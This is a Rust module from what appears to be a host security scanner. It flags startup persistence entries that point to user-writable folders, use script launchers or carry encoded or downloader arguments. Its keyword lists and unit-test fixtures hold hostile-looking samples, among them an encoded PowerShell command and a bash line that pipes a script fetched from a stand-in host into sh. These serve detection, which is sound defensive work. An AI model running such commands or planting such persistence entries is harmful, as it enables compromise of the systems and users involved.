use crate::collectors::persistence::PersistenceEntry;
use crate::report::{Evidence, EvidenceKind};

pub fn analyze_persistence_entry(entry: &PersistenceEntry) -> Vec<Evidence> {
    let command = entry.command.to_ascii_lowercase();
    let mut evidences = Vec::new();

    if has_user_writable_path(&command) {
        evidences.push(Evidence {
            kind: EvidenceKind::Persistence,
            code: "persistence.user_writable_path".to_string(),
            title: "Startup command points to user-writable path".to_string(),
            detail: entry.command.clone(),
            weight: 30,
        });
    }

    if has_script_launcher(&command) {
        evidences.push(Evidence {
            kind: EvidenceKind::Persistence,
            code: "persistence.script_launcher".to_string(),
            title: "Startup command uses script-capable launcher".to_string(),
            detail: entry.command.clone(),
            weight: 30,
        });
    }

    if has_suspicious_arguments(&command) {
        evidences.push(Evidence {
            kind: EvidenceKind::Persistence,
            code: "persistence.suspicious_arguments".to_string(),
            title: "Startup command contains encoded command, URL, or downloader".to_string(),
            detail: entry.command.clone(),
            weight: 25,
        });
    }

    evidences
}

fn has_user_writable_path(command: &str) -> bool {
    [
        "\\appdata\\",
        "/appdata/",
        "%appdata%",
        "\\temp\\",
        "/tmp/",
        "%temp%",
        "\\downloads\\",
        "/downloads/",
        "%userprofile%\\downloads",
        "$home/downloads",
        "/var/tmp/",
    ]
    .iter()
    .any(|needle| command.contains(needle))
}

fn has_script_launcher(command: &str) -> bool {
    [
        "powershell",
        "pwsh",
        "wscript",
        "cscript",
        "mshta",
        "rundll32",
        "regsvr32",
        "/bin/sh",
        "/bin/bash",
        "/usr/bin/sh",
        "/usr/bin/bash",
        "osascript",
    ]
    .iter()
    .any(|needle| command.contains(needle))
}

fn has_suspicious_arguments(command: &str) -> bool {
    [
        "-encodedcommand",
        " -enc ",
        " -e ",
        "frombase64string",
        "http://",
        "https://",
        "curl ",
        "wget ",
        "invoke-webrequest",
        "invoke-restmethod",
        " iwr ",
        " irm ",
    ]
    .iter()
    .any(|needle| command.contains(needle))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_scheduled_task_encoded_powershell() {
        let entry = PersistenceEntry {
            source: "Scheduled Task".to_string(),
            name: "\\Updater".to_string(),
            command: "powershell.exe -EncodedCommand SQBFAFgA".to_string(),
            platform: "windows".to_string(),
        };
        let evidences = analyze_persistence_entry(&entry);
        assert_eq!(evidences.len(), 2);
    }

    #[test]
    fn detects_appdata_short_encoded_powershell() {
        let entry = PersistenceEntry {
            source: "HKCU\\Run".to_string(),
            name: "Updater".to_string(),
            command: r#"%APPDATA%\updater\run.ps1 powershell -enc SQBFAFgA"#.to_string(),
            platform: "windows".to_string(),
        };
        let codes = analyze_persistence_entry(&entry)
            .into_iter()
            .map(|evidence| evidence.code)
            .collect::<Vec<_>>();

        assert!(codes.contains(&"persistence.user_writable_path".to_string()));
        assert!(codes.contains(&"persistence.script_launcher".to_string()));
        assert!(codes.contains(&"persistence.suspicious_arguments".to_string()));
    }

    #[test]
    fn detects_usr_bin_bash_download_launcher() {
        let entry = PersistenceEntry {
            source: "~/.config/systemd/user/updater.service".to_string(),
            name: "updater.service".to_string(),
            command: "/usr/bin/bash -lc 'iwr https://example.test/p.sh | sh'".to_string(),
            platform: "linux".to_string(),
        };
        let codes = analyze_persistence_entry(&entry)
            .into_iter()
            .map(|evidence| evidence.code)
            .collect::<Vec<_>>();

        assert!(codes.contains(&"persistence.script_launcher".to_string()));
        assert!(codes.contains(&"persistence.suspicious_arguments".to_string()));
    }
}
